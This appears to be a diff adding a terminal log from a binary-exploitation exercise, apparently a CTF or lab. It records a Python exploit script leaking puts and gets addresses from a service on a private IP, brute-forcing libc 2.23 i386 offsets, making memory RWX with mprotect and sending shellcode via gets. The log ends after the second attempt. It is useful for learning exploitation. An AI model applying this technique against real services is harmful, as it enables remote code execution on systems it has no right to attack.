@@ -1,0 +1,28 @@
+└─$ python3 getLeakRemoteBruteForce.py 
+[+] Opening connection to 192.168.0.155 on port 9000: Done
+[+] Leaked address of puts: 0xb7655cb0
+[*] Closed connection to 192.168.0.155 port 9000
+[+] Opening connection to 192.168.0.155 on port 9000: Done
+[+] Leaked address of gets: 0xb76643f0
+[*] Closed connection to 192.168.0.155 port 9000
+[+] Retrieved potential libc versions for puts: 0xb7655cb0 and gets: 0xb76643f0
+
+[*] Trying offsets for libc version: libc6_2.23-0ubuntu11.2_i386
+[*] Offsets - puts: 0x5fcb0, system: 0x3adb0, str_bin_sh: 0x15bb0b, exit: 0x2e9e0, mprotect: 0xe2ea0, printf: 0x49680
+[+] Opening connection to 192.168.0.155 on port 9000: Done
+[+] Leaked address of puts: 0xb7649cb0
+[+] LIBC base: 0xb75ea000
+[+] Changed protections for 0xb75ea000-0xb760b000 to RWX with mprotect
+[+] Called gets(0xb75ea000) with 0xb75ea000 as return addr
+[+] Sent shellcode to 0xb75ea000 via gets
+[-] Recieved premature EOF
+[*] Closed connection to 192.168.0.155 port 9000
+
+[*] Trying offsets for libc version: libc6_2.23-0ubuntu11.3_i386
+[*] Offsets - puts: 0x5fcb0, system: 0x3adb0, str_bin_sh: 0x15bb2b, exit: 0x2e9e0, mprotect: 0xe2ec0, printf: 0x49680
+[+] Opening connection to 192.168.0.155 on port 9000: Done
+[+] Leaked address of puts: 0xb75f9cb0
+[+] LIBC base: 0xb759a000
+[+] Changed protections for 0xb759a000-0xb75bb000 to RWX with mprotect
+[+] Called gets(0xb759a000) with 0xb759a000 as return addr
+[+] Sent shellcode to 0xb759a000 via gets
